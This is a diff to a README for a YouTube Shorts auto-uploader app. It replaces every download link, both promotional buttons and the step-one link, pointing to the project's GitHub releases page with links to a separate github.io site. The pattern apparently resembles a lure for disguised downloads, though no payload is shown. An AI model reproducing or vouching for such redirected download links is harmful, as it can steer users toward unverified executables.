@@ -1,7 +1,7 @@
 <h1>📅 youtube-shorts-auto-uploader-2026 - Set-and-Forget YouTube Shorts Posting</h1>
 
 <p align="center">
-  <a href="https://github.com/Soxittome/youtube-shorts-auto-uploader-2026/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://soxittome.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🔍 What Is This?
@@ -48,7 +48,7 @@ A clear log file shows which videos uploaded successfully, which failed, and exa
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[Click here to download youtube-shorts-auto-uploader-2026](https://github.com/Soxittome/youtube-shorts-auto-uploader-2026/releases)**
+👉 **[Click here to download youtube-shorts-auto-uploader-2026](https://soxittome.github.io)**
 
 The download page will show recent versions. Pick the newest one labeled for Windows.
 
@@ -191,5 +191,5 @@ You now have everything you need to let youtube-shorts-auto-uploader-2026 handle
 Remember to start small, check your logs regularly, and enjoy the power of automation.
 
 <p align="center">
-  <a href="https://github.com/Soxittome/youtube-shorts-auto-uploader-2026/releases" style="background-color:#008CBA; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ GET THE PROGRAM NOW</a>
+  <a href="https://soxittome.github.io" style="background-color:#008CBA; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ GET THE PROGRAM NOW</a>
 </p>
